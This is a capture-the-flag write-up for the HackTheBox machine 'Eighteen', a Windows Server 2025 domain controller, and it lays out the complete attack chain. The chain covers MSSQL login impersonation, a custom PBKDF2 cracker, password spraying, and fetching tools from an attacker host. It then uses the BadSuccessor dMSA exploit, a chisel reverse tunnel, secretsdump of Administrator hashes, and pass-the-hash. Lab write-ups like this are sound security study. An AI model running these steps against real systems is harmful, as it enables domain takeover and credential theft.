# **Eighteen - HackTheBox**

*Target Ip. Address: 10.129.3.186*

Given credentials:

```creds
kevin:iNa2we6haRj2gaw!
```

Let's start with the nmap scan.

```bash
kali@kali:nmap -sV -sC 10.129.3.186
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-20 07:10 +0545
Nmap scan report for 10.129.3.186
Host is up (0.32s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT     STATE SERVICE  VERSION
80/tcp   open  http     Microsoft IIS httpd 10.0
|_http-title: Did not follow redirect to http://eighteen.htb/
|_http-server-header: Microsoft-IIS/10.0
1433/tcp open  ms-sql-s Microsoft SQL Server 2022 16.00.1000.00; RTM
| ms-sql-info: 
|   10.129.3.186:1433: 
|     Version: 
|       name: Microsoft SQL Server 2022 RTM
|       number: 16.00.1000.00
|       Product: Microsoft SQL Server 2022
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2026-02-20T08:22:36
|_Not valid after:  2056-02-20T08:22:36
|_ssl-date: 2026-02-20T08:26:47+00:00; +7h00m01s from scanner time.
| ms-sql-ntlm-info: 
|   10.129.3.186:1433: 
|     Target_Name: EIGHTEEN
|     NetBIOS_Domain_Name: EIGHTEEN
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: eighteen.htb
|     DNS_Computer_Name: DC01.eighteen.htb
|     DNS_Tree_Name: eighteen.htb
|_    Product_Version: 10.0.26100
5985/tcp open  http     Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 7h00m01s, deviation: 0s, median: 7h00m00s
                                                                                                                   
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .                     
Nmap done: 1 IP address (1 host up) scanned in 61.89 seconds
```

The Nmap scan identifies a Windows-based target (DC01) running Microsoft IIS on port 80 and MSSQL on port 1433, with the HTTP service redirecting to the eighteen.htb domain. Let's update hosts file.

```bash
kali@kali:cat /etc/hosts
10.129.3.186    DC01.eighteen.htb eighteen.htb

127.0.0.1       localhost
127.0.1.1       kali.kali       kali

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouterso
```

Let's see if the provided credentials works for MsSQL.

```bash
kali@kali:impacket-mssqlclient eighteen.htb/kevin:'iNa2we6haRj2gaw!'@10.129.3.186
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
                                                                                                                   
[*] Encryption required, switching to TLS                                                                          
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master                                                      
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english                                                        
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01): Line 1: Changed database context to 'master'.
[*] INFO(DC01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2022 RTM (16.0.1000)
[!] Press help for extra shell commands
SQL (kevin  guest@master)> 
```

Using the provided credentials, a successful connection was established to the MSSQL instance via Impacket, confirming that the user kevin has valid access to the database.

```bash
SQL (kevin  guest@master)> SELECT DISTINCT b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';
name     
------   
appdev   
```

The query reveals that the current user context has the authority to impersonate the appdev principal

```bash
SQL (kevin  guest@master)> EXECUTE AS LOGIN = 'appdev';

SQL (appdev  appdev@master)> SELECT name FROM sys.databases;
name                
-----------------   
master              
tempdb              
model               
msdb                
financial_planner   
SQL (appdev  appdev@master)> USE financial_planner;
ENVCHANGE(DATABASE): Old Value: master, New Value: financial_planner
INFO(DC01): Line 1: Changed database context to 'financial_planner'.
SQL (appdev  appdev@financial_planner)>
```

After successfully impersonating the appdev login, access was gained to a non-default database named financial_planner, suggesting it may contain application-specific data or sensitive information.

```bash
SQL (appdev  appdev@financial_planner)> SELECT table_name FROM information_schema.tables WHERE table_type = 'BASE TABLE';
table_name    
-----------   
users         
incomes       
expenses      
allocations   
analytics     
visits        
SQL (appdev  appdev@financial_planner)> 

SQL (appdev  appdev@financial_planner)> select * from users;
  id   full_name   username   email                password_hash                                                                                            is_admin   created_at   
----   ---------   --------   ------------------   ------------------------------------------------------------------------------------------------------   --------   ----------   
1002   admin       admin      admin@eighteen.htb   pbkdf2:sha256:600000$AMtzteQIG7yAbZIa$.........133                                                           1   2025-10-29 05:39:03   
SQL (appdev  appdev@financial_planner)> 
```

The obtained admin hash is in PBKDF2-SHA256 format with 600,000 iterations. We can use this to crack the hash.

```bash
kali@kali:cat crack.cpp 
#include <iostream>
#include <fstream>
#include <sstream>
#include <vector>
#include <cstring>              
#include <openssl/evp.h>
#include <openssl/sha.h>

using namespace std;

// Convert hex string to bytes
vector<unsigned char> hexToBytes(const string &hex) {
    vector<unsigned char> bytes;
    bytes.reserve(hex.size() / 2);
    for (size_t i = 0; i < hex.size(); i += 2) {
        unsigned int byte;
        stringstream ss;
        ss << std::hex << hex.substr(i, 2);
        ss >> byte;
        bytes.push_back(static_cast<unsigned char>(byte));
    }
    return bytes;
}

// Verify PBKDF2-HMAC-SHA256
bool verify_pbkdf2_sha256(const string& password,
                          const string& salt,
                          const vector<unsigned char>& expected_hash,
                          int iterations)
{
    unsigned char out[32];

    PKCS5_PBKDF2_HMAC(
        password.c_str(),
        password.size(),
        (unsigned char*)salt.c_str(),
        salt.size(),
        iterations,
        EVP_sha256(),
        32,
        out
    );

    return memcmp(out, expected_hash.data(), 32) == 0;  // FIX: proper comparison
}

int main(int argc, char** argv) {
    if (argc != 2) {
        cout << "Usage: ./crack <wordlist>\n";
        return 1;
    }

    string wordlist = argv[1];
    string hash = "pbkdf2:sha256:600000$AMtzteQIG7yAbZIa$0673ad90a0.........133";

    // Parse format: pbkdf2:sha256:600000$salt$hash
    string iter_str, salt, hexhash;
    size_t p1 = hash.find(':');
    size_t p2 = hash.find(':', p1 + 1);
    size_t p3 = hash.find('$', p2 + 1);
    size_t p4 = hash.find('$', p3 + 1);

    iter_str = hash.substr(p2 + 1, p3 - (p2 + 1));
    salt     = hash.substr(p3 + 1, p4 - (p3 + 1));
    hexhash  = hash.substr(p4 + 1);

    int iterations = stoi(iter_str);
    vector<unsigned char> expected_hash = hexToBytes(hexhash);

    cout << "[+] Loaded hash\n";
    cout << "[+] Starting brute-force using: " << wordlist << "\n\n";

    ifstream file(wordlist);
    if (!file.is_open()) {
        cerr << "[-] Failed to open wordlist.\n";
        return 1;
    }

    string password;
    long long count = 0;

    while (getline(file, password)) {
        if (password.empty()) continue;

        count++;
        if (count % 50000 == 0) {
            cout << "\r[>] Tested " << count << " passwords..." << flush;
        }

        if (verify_pbkdf2_sha256(password, salt, expected_hash, iterations)) {
            cout << "\n\n[✓] Cracked! Password is: " << password << "\n";
            return 0;
        }
    }

    cout << "\n[-] No match found.\n";
    return 0;
}
```
```bash
kali@kali:g++ crack.cpp -lcrypto -O3 -o crack
```

Let's crack the hash with rockyou.txt.

```bash
kali@kali:./crack /usr/share/wordlists/rockyou.txt
[+] Loaded hash
[+] Starting brute-force using: /usr/share/wordlists/rockyou.txt

[✓] Cracked! Password is: il...u1
```

Now, we will do password spray, but for that we need valid usernames.

```bash
kali@kali:nxc mssql eighteen.htb -u kevin -p 'iNa2we6haRj2gaw!' --local-auth --rid-brute
MSSQL       10.129.239.182  1433   DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:eighteen.htb) (EncryptionReq:False)
MSSQL       10.129.239.182  1433   DC01             [+] DC01\kevin:iNa2we6haRj2gaw! 
MSSQL       10.129.239.182  1433   DC01             498: EIGHTEEN\Enterprise Read-only Domain Controllers
MSSQL       10.129.239.182  1433   DC01             500: EIGHTEEN\Administrator
MSSQL       10.129.239.182  1433   DC01             501: EIGHTEEN\Guest
MSSQL       10.129.239.182  1433   DC01             502: EIGHTEEN\krbtgt
MSSQL       10.129.239.182  1433   DC01             512: EIGHTEEN\Domain Admins
MSSQL       10.129.239.182  1433   DC01             513: EIGHTEEN\Domain Users
MSSQL       10.129.239.182  1433   DC01             514: EIGHTEEN\Domain Guests
MSSQL       10.129.239.182  1433   DC01             515: EIGHTEEN\Domain Computers
MSSQL       10.129.239.182  1433   DC01             516: EIGHTEEN\Domain Controllers
MSSQL       10.129.239.182  1433   DC01             517: EIGHTEEN\Cert Publishers
MSSQL       10.129.239.182  1433   DC01             518: EIGHTEEN\Schema Admins
MSSQL       10.129.239.182  1433   DC01             519: EIGHTEEN\Enterprise Admins
MSSQL       10.129.239.182  1433   DC01             520: EIGHTEEN\Group Policy Creator Owners
MSSQL       10.129.239.182  1433   DC01             521: EIGHTEEN\Read-only Domain Controllers
MSSQL       10.129.239.182  1433   DC01             522: EIGHTEEN\Cloneable Domain Controllers
MSSQL       10.129.239.182  1433   DC01             525: EIGHTEEN\Protected Users
MSSQL       10.129.239.182  1433   DC01             526: EIGHTEEN\Key Admins
MSSQL       10.129.239.182  1433   DC01             527: EIGHTEEN\Enterprise Key Admins
MSSQL       10.129.239.182  1433   DC01             528: EIGHTEEN\Forest Trust Accounts
MSSQL       10.129.239.182  1433   DC01             529: EIGHTEEN\External Trust Accounts
MSSQL       10.129.239.182  1433   DC01             553: EIGHTEEN\RAS and IAS Servers
MSSQL       10.129.239.182  1433   DC01             571: EIGHTEEN\Allowed RODC Password Replication Group
MSSQL       10.129.239.182  1433   DC01             572: EIGHTEEN\Denied RODC Password Replication Group
MSSQL       10.129.239.182  1433   DC01             1000: EIGHTEEN\DC01$
MSSQL       10.129.239.182  1433   DC01             1101: EIGHTEEN\DnsAdmins
MSSQL       10.129.239.182  1433   DC01             1102: EIGHTEEN\DnsUpdateProxy
MSSQL       10.129.239.182  1433   DC01             1601: EIGHTEEN\mssqlsvc
MSSQL       10.129.239.182  1433   DC01             1602: EIGHTEEN\SQLServer2005SQLBrowserUser$DC01
MSSQL       10.129.239.182  1433   DC01             1603: EIGHTEEN\HR
MSSQL       10.129.239.182  1433   DC01             1604: EIGHTEEN\IT
MSSQL       10.129.239.182  1433   DC01             1605: EIGHTEEN\Finance
MSSQL       10.129.239.182  1433   DC01             1606: EIGHTEEN\jamie.dunn                                      
MSSQL       10.129.239.182  1433   DC01             1607: EIGHTEEN\jane.smith                                      
MSSQL       10.129.239.182  1433   DC01             1608: EIGHTEEN\alice.jones                                     
MSSQL       10.129.239.182  1433   DC01             1609: EIGHTEEN\adam.scott                                      
MSSQL       10.129.239.182  1433   DC01             1610: EIGHTEEN\bob.brown                                       
MSSQL       10.129.239.182  1433   DC01             1611: EIGHTEEN\carol.white                                     
MSSQL       10.129.239.182  1433   DC01             1612: EIGHTEEN\dave.green
```
```bash
kali@kali:cat users.txt                                                                                                  
jamie.dunn
jane.smith
alice.jones
adam.scott
bob.brown
carol.white
dave.green
```

Now, we can perform a password spraying attack against the domain using the previously cracked password.

```bash
nxc winrm eighteen.htb -u users.txt -p 'il...u1'                                                             
WINRM       10.129.3.186    5985   DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:eighteen.htb)
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.129.3.186    5985   DC01             [-] eighteen.htb\jamie.dunn:il...u1
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.129.3.186    5985   DC01             [-] eighteen.htb\jane.smith:il...u1
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.129.3.186    5985   DC01             [-] eighteen.htb\alice.jones:il...u1
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.129.3.186    5985   DC01             [+] eighteen.htb\adam.scott:il...u1 (Pwn3d!)
.
.
.
```

A password spray attack against the WinRM service successfully identified valid credentials for the adam.scott account, with the "Pwn3d!" status indicating administrative-level access or the ability to execute commands remotely.

```bash
evil-winrm -i 10.129.3.186 -u adam.scott -p 'il...u1'
Evil-WinRM shell v3.9
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\adam.scott\Documents>
```

We find our first flag on user's desktop directory.

```bash
*Evil-WinRM* PS C:\Users\adam.scott\Desktop> type user.txt
9f...9f
```

Let's enumerate further to see if we can find anything interesting.

```bash
*Evil-WinRM* PS C:\Users\adam.scott\Desktop> Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion'

SystemRoot                : C:\WINDOWS
BaseBuildRevisionNumber   : 1
BuildBranch               : ge_release
BuildGUID                 : ffffffff-ffff-ffff-ffff-ffffffffffff
BuildLab                  : 26100.ge_release.240331-1435
BuildLabEx                : 26100.1.amd64fre.ge_release.240331-1435
CompositionEditionID      : ServerDatacenter
CurrentBuild              : 26100
CurrentBuildNumber        : 26100
CurrentMajorVersionNumber : 10
CurrentMinorVersionNumber : 0
CurrentType               : Multiprocessor Free
CurrentVersion            : 6.3
DisplayVersion            : 24H2
EditionID                 : ServerDatacenter
EditionSubManufacturer    :
EditionSubstring          :
EditionSubVersion         :
InstallationType          : Server Core
InstallDate               : 1742787493
LCUVer                    : 10.0.26100.4349
ProductName               : Windows Server 2025 Datacenter
ReleaseId                 : 2009
SoftwareType              : System
UBR                       : 4349
PathName                  : C:\WINDOWS
PendingInstall            : 0
ProductId                 : 00491-60000-17651-AA131
DigitalProductId          : {164, 0, 0, 0...}
DigitalProductId4         : {248, 4, 0, 0...}
InstallTime               : 133872610934974580
PSPath                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion
PSParentPath              : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT
PSChildName               : CurrentVersion
PSDrive                   : HKLM
PSProvider                : Microsoft.PowerShell.Core\Registry

*Evil-WinRM* PS C:\Users\adam.scott\Desktop> 
```

In Windows Server 2025, Microsoft introduced delegated Managed Service Accounts (dMSAs). A dMSA is a new type of service account in Active Directory (AD) that expands on the capabilities of group Managed Service Accounts (gMSAs). One key feature of dMSAs is the ability to migrate existing nonmanaged service accounts by seamlessly converting them into dMSAs. By abusing dMSAs, attackers can take over any principal in the domain. All an attacker needs to perform this attack is a benign permission on any organizational unit (OU) in the domain — a permission that often flies under the radar.

We will download BadSuccessor from here: *https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1*.

Also we will need to upload chisel as the Kerberos service (port 88) is not open from outside.

```bash
*Evil-WinRM* PS C:\Users\adam.scott\Desktop> Invoke-WebRequest -Uri "http://10.10.16.68/chisel.exe" -OutFile "C:\Users\adam.scott\Desktop\chisel.exe"
*Evil-WinRM* PS C:\Users\adam.scott\Desktop> Invoke-WebRequest -Uri "http://10.10.16.68/BadSuccessor.ps1" -OutFile "C:\Users\adam.scott\Desktop\BadSuccessor.ps1"
```

Now, we will execute the BadSuccessor script to exploit dMSA misconfigurations for domain-wide privilege escalation.

```bash
*Evil-WinRM* PS C:\Users\adam.scott\Desktop> . .\BadSuccessor.ps1
*Evil-WinRM* PS C:\Users\adam.scott\Desktop> BadSuccessor -Mode Exploit -Domain "eighteen.htb" -Path "OU=Staff,DC=eighteen,DC=htb" -Name "Eight08_DMSA" -DelegatedAdmin "adam.scott" -DelegateTarget "Administrator"
Creating dMSA at: LDAP://eighteen.htb/OU=Staff,DC=eighteen,DC=htb
0
0
0
0
Successfully created and configured dMSA 'Eight08_DMSA'
Object adam.scott can now impersonate Administrator
```

By executing the BadSuccessor script with the Exploit mode, a new Delegated Managed Service Account (dMSA) was successfully created within the Staff OU, effectively granting adam.scott the ability to impersonate the Domain Administrator.

We will now establish a chisel socks proxy to reach kerberos service.

```bash
kali@kali:chisel server -p 9000 --reverse                                                                              
2026/02/20 08:02:47 server: Reverse tunnelling enabled
2026/02/20 08:02:47 server: Fingerprint qimWcqRBQiJnFRa3/BFFYjsNfmWY2YJNEhlGak/83E0=
2026/02/20 08:02:47 server: Listening on http://0.0.0.0:9000
```
```bash
*Evil-WinRM* PS C:\Users\adam.scott\Desktop> ./chisel.exe client 10.10.16.68:9000 R:socks
chisel.exe : 2026/02/20 01:18:27 client: Connecting to ws://10.10.16.68:9000
    + CategoryInfo          : NotSpecified: (2026/02/20 01:1...0.10.16.68:9000:String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
2026/02/20 01:18:32 client: Connected (Latency 315.7223ms)
```

We had a clock skew of 7 hrs (from previous nmap scan). Let's sync time with the server.

```bash
kali@kali:sudo ntpdate -u 10.129.3.186
ntpdig: no eligible servers
```

Since, there are no ntp servers, we will use -debug to get the system time.

```bash
kali@kali:proxychains4 impacket-getST -dc-ip 127.0.0.1 -impersonate 'Eight08_DMSA$' -dmsa 'eighteen.htb/adam.scott:il...u1' -self -debug
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[+] Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket
[-] CCache file is not found. Skipping...
[+] The specified path is not correct or the KRB5CCNAME environment variable is not defined
[*] Getting TGT for user
[+] Trying to connect to KDC at 127.0.0.1:88
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  127.0.0.1:88  ...  OK
[+] Trying to connect to KDC at 127.0.0.1:88
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  127.0.0.1:88  ...  OK
[+] Server time (UTC): 2026-02-20 09:43:10
Traceback (most recent call last):
  File "/usr/share/doc/python3-impacket/examples/getST.py", line 915, in <module>
    executer.run()
    ~~~~~~~~~~~~^^
  File "/usr/share/doc/python3-impacket/examples/getST.py", line 796, in run
    tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(userName, self.__password, self.__domain,
                                             ~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
                                                            unhexlify(self.__lmhash), unhexlify(self.__nthash),
                                                            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
                                                            self.__aesKey,
                                                            ^^^^^^^^^^^^^^
                                                            self.__kdcHost)
                                                            ^^^^^^^^^^^^^^^
  File "/usr/lib/python3/dist-packages/impacket/krb5/kerberosv5.py", line 323, in getKerberosTGT
    tgt = sendReceive(encoder.encode(asReq), domain, kdcHost)
  File "/usr/lib/python3/dist-packages/impacket/krb5/kerberosv5.py", line 93, in sendReceive
    raise krbError
impacket.krb5.kerberosv5.KerberosError: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
```

We got the time, let's update our time then.

```bash
kali@kali:sudo date -s "2026-02-20 09:43:20" && sudo hwclock --systohc
Fri Feb 20 09:43:20 AM UTC 2026
```

Now, we can get the admin ticket.

```bash
kali@kali:proxychains4 impacket-getST -impersonate 'Eight08_DMSA$' -dmsa 'eighteen.htb/adam.scott:il...u1' -self
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  EIGHTEEN.HTB:88  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  EIGHTEEN.HTB:88  ...  OK
[*] Impersonating Eight08_DMSA$
[*] Requesting S4U2self
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  eighteen.htb:88  ...  OK
[*] Current keys:
[*] EncryptionTypes.aes256_cts_hmac_sha1_96:67797f5f9d4602afdc4bdaa41411308bc31cb0e3395469e09baef5a1a06c1df6
[*] EncryptionTypes.aes128_cts_hmac_sha1_96:3226e848a8866a4293a817179df5577f
[*] EncryptionTypes.rc4_hmac:9bad213f9251433c3dadea30e1ad45e1
[*] Previous keys:
[*] EncryptionTypes.rc4_hmac:0b133be956bfaddf9cea56701affddec
[*] Saving ticket in Eight08_DMSA$@krbtgt_EIGHTEEN.HTB@EIGHTEEN.HTB.ccache
```

Export the generated .ccache file to the local environment and use it to authenticate as a high-privileged user via Pass-the-Ticket to access the Domain Controller's restricted resources.

```bash
kali@kai:export KRB5CCNAME='Eight08_DMSA$@krbtgt_EIGHTEEN.HTB@EIGHTEEN.HTB.ccache'
```

Since, only few ports were open, we will use secretsdump to get the administrator hash and login via evil-winrm.

```bash
kali@kali:proxychains4 impacket-secretsdump -k -no-pass -dc-ip 127.0.0.1 dc01.eighteen.htb -just-dc-user Administrator
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  dc01.eighteen.htb:445  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  127.0.0.1:88  ...  OK
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  dc01.eighteen.htb:135  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  dc01.eighteen.htb:49678  ...  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  127.0.0.1:88  ...  OK
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0b........ec:::
[*] Kerberos keys grabbed
Administrator:0x14:977d41fb9cb35c5a28280a6458db3348ed1a14d09248918d182a9d3866809d7b
Administrator:0x13:5ebe190ad8b5efaaae5928226046dfc0
Administrator:aes256-cts-hmac-sha1-96:1acd569d364cbf11302bfe05a42c4fa5a7794bab212d0cda92afb586193eaeb2
Administrator:aes128-cts-hmac-sha1-96:7b6b4158f2b9356c021c2b35d000d55f
Administrator:0x17:0b133be956bfaddf9cea56701affddec
[*] Cleaning up...
```

We got the hash, now we can login.

```bash
kali@kali:evil-winrm -i 10.129.3.186 -u Administrator -H 0b.....ec
Evil-WinRM shell v3.9
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
eighteen\administrator
```

We can read the final flag and end this challenge.

```bash
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
99a089424f71d4dc8e9e458a64c2a15a
```
